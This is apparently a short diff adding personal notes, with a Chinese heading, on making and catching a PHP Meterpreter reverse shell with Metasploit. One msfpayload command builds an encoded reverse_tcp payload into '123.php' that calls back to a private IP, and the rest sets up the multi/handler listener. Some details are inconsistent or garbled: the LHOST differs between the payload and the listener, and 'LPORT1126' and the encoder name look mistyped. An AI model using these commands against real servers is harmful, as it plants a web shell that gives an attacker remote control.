@@ -1,0 +1,11 @@
+php
+msfpayload php/meterpreter/reverse_tcp LHOST=192.168.2.133 LPORT=1126 R|msfencode -e /php/base6 -t raw -o 123.php
+
+
+监听shellcode
+msf
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST 192.168.40.133
+set LPORT1126
+exploit
